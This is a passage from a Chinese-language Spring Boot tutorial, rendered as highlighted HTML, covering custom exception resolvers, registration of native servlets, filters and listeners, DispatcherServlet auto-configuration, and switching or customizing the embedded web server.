class="hljs-meta">@RequestParam(value=&quot;pn&quot;,defaultValue = &quot;1&quot;)</span> Integer pn,Model model)</span>&#123;<br>        <span class="hljs-comment">//表格内容的遍历</span><br>     List&lt;User&gt; users = Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;lisi&quot;</span>, <span class="hljs-string">&quot;123444&quot;</span>),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;haha&quot;</span>, <span class="hljs-string">&quot;aaaaa&quot;</span>),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;hehe &quot;</span>, <span class="hljs-string">&quot;aaddd&quot;</span>));<br>        model.addAttribute(<span class="hljs-string">&quot;users&quot;</span>,users);<br><br>        <span class="hljs-keyword">if</span>(users.size()&gt;<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserTooManyException</span>();<span class="hljs-comment">//抛出自定义异常</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;table/dynamic_table&quot;</span>;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>Spring自家异常如 <code> org.springframework.web.bind.MissingServletRequestParameterException</code>，<code>DefaultHandlerExceptionResolver</code> 处理Spring自家异常。</p></li><li><ul><li><code>response.sendError(HttpServletResponse.SC_BAD_REQUEST/*400*/, ex.getMessage());</code></li></ul></li><li><p>自定义实现 <code>HandlerExceptionResolver</code> 处理异常；可以作为默认的全局异常处理规则</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Order(value= Ordered.HIGHEST_PRECEDENCE)</span>  <span class="hljs-comment">//优先级，数字越小优先级越高</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomerHandlerExceptionResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerExceptionResolver</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">resolveException</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">                                         HttpServletResponse response,</span><br><span class="hljs-params">                                         Object handler, Exception ex)</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            response.sendError(<span class="hljs-number">511</span>,<span class="hljs-string">&quot;我喜欢的错误&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>ErrorViewResolver</code>  实现自定义处理异常<ul><li><code>response.sendError()</code>，error请求就会转给controller。</li><li>你的异常没有任何人能处理，tomcat底层调用<code>response.sendError()</code>，error请求就会转给controller。</li><li><code>basicErrorController</code> 要去的页面地址是 <code>ErrorViewResolver</code>  。</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicErrorController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractErrorController</span> &#123;<br><br>    ...<br>    <br><span class="hljs-meta">@RequestMapping(produces = MediaType.TEXT_HTML_VALUE)</span><br><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">errorHtml</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br><span class="hljs-type">HttpStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> getStatus(request);<br>Map&lt;String, Object&gt; model = Collections<br>.unmodifiableMap(getErrorAttributes(request, getErrorAttributeOptions(request, MediaType.TEXT_HTML)));<br>response.setStatus(status.value());<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> resolveErrorView(request, response, status, model);<br><span class="hljs-keyword">return</span> (modelAndView != <span class="hljs-literal">null</span>) ? modelAndView : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;error&quot;</span>, model);<br>&#125;<br>    <br>    <span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">resolveErrorView</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, HttpStatus status,</span><br><span class="hljs-params">Map&lt;String, Object&gt; model)</span> &#123;<br>        <span class="hljs-comment">//这里用到ErrorViewResolver接口</span><br><span class="hljs-keyword">for</span> (ErrorViewResolver resolver : <span class="hljs-built_in">this</span>.errorViewResolvers) &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> resolver.resolveErrorView(request, status, model);<br><span class="hljs-keyword">if</span> (modelAndView != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span> modelAndView;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@FunctionalInterface</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ErrorViewResolver</span> &#123;<br><br>ModelAndView <span class="hljs-title function_">resolveErrorView</span><span class="hljs-params">(HttpServletRequest request, HttpStatus status, Map&lt;String, Object&gt; model)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="56、原生组件注入-原生注解与Spring方式注入"><a href="#56、原生组件注入-原生注解与Spring方式注入" class="headerlink" title="56、原生组件注入-原生注解与Spring方式注入"></a>56、原生组件注入-原生注解与Spring方式注入</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#howto-add-a-servlet-filter-or-listener">官方文档 - Servlets, Filters, and listeners</a></p><h3 id="使用原生的注解"><a href="#使用原生的注解" class="headerlink" title="使用原生的注解"></a>使用原生的注解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(urlPatterns = &quot;/my&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.getWriter().write(<span class="hljs-string">&quot;66666&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@WebFilter(urlPatterns=&#123;&quot;/css/*&quot;,&quot;/images/*&quot;&#125;)</span> <span class="hljs-comment">//my</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        log.info(<span class="hljs-string">&quot;MyFilter初始化完成&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        log.info(<span class="hljs-string">&quot;MyFilter工作&quot;</span>);<br>        chain.doFilter(request,response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        log.info(<span class="hljs-string">&quot;MyFilter销毁&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServletContextListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContextListener</span> &#123;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextInitialized</span><span class="hljs-params">(ServletContextEvent sce)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;MySwervletContextListener监听到项目初始化完成&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextDestroyed</span><span class="hljs-params">(ServletContextEvent sce)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;MySwervletContextListener监听到项目销毁&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后还要在主启动类添加注解<code>@ServletComponentScan</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ServletComponentScan(basePackages = &quot;com.lun&quot;)</span><span class="hljs-comment">//</span><br><span class="hljs-meta">@SpringBootApplication(exclude = RedisAutoConfiguration.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Boot05WebAdminApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(Boot05WebAdminApplication.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Spring方式注入"><a href="#Spring方式注入" class="headerlink" title="Spring方式注入"></a>Spring方式注入</h3><p><code>ServletRegistrationBean</code>, <code>FilterRegistrationBean</code>, and <code>ServletListenerRegistrationBean</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = true)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRegistConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletRegistrationBean <span class="hljs-title function_">myServlet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">MyServlet</span> <span class="hljs-variable">myServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyServlet</span>();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRegistrationBean</span>(myServlet,<span class="hljs-string">&quot;/my&quot;</span>,<span class="hljs-string">&quot;/my02&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FilterRegistrationBean <span class="hljs-title function_">myFilter</span><span class="hljs-params">()</span>&#123;<br><br>        <span class="hljs-type">MyFilter</span> <span class="hljs-variable">myFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyFilter</span>();<br><span class="hljs-comment">//        return new FilterRegistrationBean(myFilter,myServlet());</span><br>        <span class="hljs-type">FilterRegistrationBean</span> <span class="hljs-variable">filterRegistrationBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterRegistrationBean</span>(myFilter);<br>        filterRegistrationBean.setUrlPatterns(Arrays.asList(<span class="hljs-string">&quot;/my&quot;</span>,<span class="hljs-string">&quot;/css/*&quot;</span>));<br>        <span class="hljs-keyword">return</span> filterRegistrationBean;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletListenerRegistrationBean <span class="hljs-title function_">myListener</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">MySwervletContextListener</span> <span class="hljs-variable">mySwervletContextListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySwervletContextListener</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletListenerRegistrationBean</span>(mySwervletContextListener);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="57、原生组件注入-【源码分析】DispatcherServlet注入原理"><a href="#57、原生组件注入-【源码分析】DispatcherServlet注入原理" class="headerlink" title="57、原生组件注入-【源码分析】DispatcherServlet注入原理"></a>57、原生组件注入-【源码分析】DispatcherServlet注入原理</h2><p><code>org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration</code>配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(DispatcherServlet.class)</span><br><span class="hljs-meta">@AutoConfigureAfter(ServletWebServerFactoryAutoConfiguration.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServletAutoConfiguration</span> &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The bean name for a DispatcherServlet that will be mapped to the root URL &quot;/&quot;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_DISPATCHER_SERVLET_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dispatcherServlet&quot;</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The bean name for a ServletRegistrationBean for the DispatcherServlet &quot;/&quot;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dispatcherServletRegistration&quot;</span>;<br><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@Conditional(DefaultDispatcherServletCondition.class)</span><br><span class="hljs-meta">@ConditionalOnClass(ServletRegistration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(WebMvcProperties.class)</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServletConfiguration</span> &#123;<br><br>        <span class="hljs-comment">//创建DispatcherServlet类的Bean</span><br><span class="hljs-meta">@Bean(name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span><br><span class="hljs-keyword">public</span> DispatcherServlet <span class="hljs-title function_">dispatcherServlet</span><span class="hljs-params">(WebMvcProperties webMvcProperties)</span> &#123;<br><span class="hljs-type">DispatcherServlet</span> <span class="hljs-variable">dispatcherServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispatcherServlet</span>();<br>dispatcherServlet.setDispatchOptionsRequest(webMvcProperties.isDispatchOptionsRequest());<br>dispatcherServlet.setDispatchTraceRequest(webMvcProperties.isDispatchTraceRequest());<br>dispatcherServlet.setThrowExceptionIfNoHandlerFound(webMvcProperties.isThrowExceptionIfNoHandlerFound());<br>dispatcherServlet.setPublishEvents(webMvcProperties.isPublishRequestHandledEvents());<br>dispatcherServlet.setEnableLoggingRequestDetails(webMvcProperties.isLogRequestDetails());<br><span class="hljs-keyword">return</span> dispatcherServlet;<br>&#125;<br><br><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnBean(MultipartResolver.class)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)</span><br><span class="hljs-keyword">public</span> MultipartResolver <span class="hljs-title function_">multipartResolver</span><span class="hljs-params">(MultipartResolver resolver)</span> &#123;<br><span class="hljs-comment">// Detect if the user has created a MultipartResolver but named it incorrectly</span><br><span class="hljs-keyword">return</span> resolver;<br>&#125;<br><br>&#125;<br>    <br>    <span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@Conditional(DispatcherServletRegistrationCondition.class)</span><br><span class="hljs-meta">@ConditionalOnClass(ServletRegistration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(WebMvcProperties.class)</span><br><span class="hljs-meta">@Import(DispatcherServletConfiguration.class)</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServletRegistrationConfiguration</span> &#123;<br><br>        <span class="hljs-comment">//注册DispatcherServlet类</span><br><span class="hljs-meta">@Bean(name = DEFAULT_DISPATCHER_SERVLET_REGISTRATION_BEAN_NAME)</span><br><span class="hljs-meta">@ConditionalOnBean(value = DispatcherServlet.class, name = DEFAULT_DISPATCHER_SERVLET_BEAN_NAME)</span><br><span class="hljs-keyword">public</span> DispatcherServletRegistrationBean <span class="hljs-title function_">dispatcherServletRegistration</span><span class="hljs-params">(DispatcherServlet dispatcherServlet,</span><br><span class="hljs-params">WebMvcProperties webMvcProperties, ObjectProvider&lt;MultipartConfigElement&gt; multipartConfig)</span> &#123;<br><span class="hljs-type">DispatcherServletRegistrationBean</span> <span class="hljs-variable">registration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispatcherServletRegistrationBean</span>(dispatcherServlet,<br>webMvcProperties.getServlet().getPath());<br>registration.setName(DEFAULT_DISPATCHER_SERVLET_BEAN_NAME);<br>registration.setLoadOnStartup(webMvcProperties.getServlet().getLoadOnStartup());<br>multipartConfig.ifAvailable(registration::setMultipartConfig);<br><span class="hljs-keyword">return</span> registration;<br>&#125;<br><br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>DispatcherServlet</code>默认映射的是 <code>/</code> 路径，可以通过在配置文件修改<code>spring.mvc.servlet.path=/mvc</code>。</p><h2 id="58、嵌入式Servlet容器-【源码分析】切换web服务器与定制化"><a href="#58、嵌入式Servlet容器-【源码分析】切换web服务器与定制化" class="headerlink" title="58、嵌入式Servlet容器-【源码分析】切换web服务器与定制化"></a>58、嵌入式Servlet容器-【源码分析】切换web服务器与定制化</h2><ul><li><p>默认支持的WebServer</p><ul><li><code>Tomcat</code>, <code>Jetty</code>, or <code>Undertow</code>。</li><li><code>ServletWebServerApplicationContext </code>容器启动寻找<code>ServletWebServerFactory</code> 并引导创建服务器。</li></ul></li><li><p>原理</p><ul><li>SpringBoot应用启动发现当前是Web应用，web场景包-导入tomcat。</li><li>web应用会创建一个web版的IOC容器 <code>ServletWebServerApplicationContext</code> 。</li><li><code>ServletWebServerApplicationContext</code>  启动的时候寻找 <code>ServletWebServerFactory</code> （Servlet 的web服务器工厂——&gt;Servlet 的web服务器）。</li><li>SpringBoot底层默认有很多的WebServer工厂（<code>ServletWebServerFactoryConfiguration</code>内创建Bean），如：<ul><li><code>TomcatServletWebServerFactory</code></li><li><code>JettyServletWebServerFactory</code></li><li><code>UndertowServletWebServerFactory</code></li></ul></li><li>底层直接会有一个自动配置类<code>ServletWebServerFactoryAutoConfiguration</code>。</li><li><code>ServletWebServerFactoryAutoConfiguration</code>导入了<code>ServletWebServerFactoryConfiguration</code>（配置类）。</li><li><code>ServletWebServerFactoryConfiguration  </code>根据动态判断系统中到底导入了那个Web服务器的包。（默认是web-starter导入tomcat包），容器中就有 <code>TomcatServletWebServerFactory</code></li><li><code>TomcatServletWebServerFactory </code>创建出Tomcat服务器并启动；<code>TomcatWebServer</code> 的构造器拥有初始化方法initialize——<code>this.tomcat.start();</code></li><li>内嵌服务器，与以前手动把启动服务器相比，改成现在使用代码启动（tomcat核心jar包存在）。</li></ul></li></ul><p>Spring Boot默认使用Tomcat服务器，若需更改其他服务器，则修改工程pom.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">exclusions</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">exclusion</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">exclusion</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">exclusions</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#howto-use-another-web-server">官方文档 - Use Another Web Server</a></p><h3 id="定制Servlet容器"><a href="#定制Servlet容器" class="headerlink" title="定制Servlet容器"></a>定制Servlet容器</h3><ul><li><p>实现<code>WebServerFactoryCustomizer&lt;ConfigurableServletWebServerFactory&gt;</code> </p></li><li><ul><li>把配置文件的值和<code>ServletWebServerFactory</code>进行绑定</li></ul></li><li><p>修改配置文件 <code>server.xxx</code></p></li><li><p>直接自定义 <code>ConfigurableServletWebServerFactory</code></p></li></ul><p><code>xxxxxCustomizer</code>：定制化器，可以改变xxxx的默认规则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;<br><span class="hljs-keyword">import</span> org.springframework.boot.web.servlet.server.ConfigurableServletWebServerFactory;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomizationBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebServerFactoryCustomizer</span>&lt;ConfigurableServletWebServerFactory&gt; &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">customize</span><span class="hljs-params">(ConfigurableServletWebServerFactory server)</span> &#123;<br>        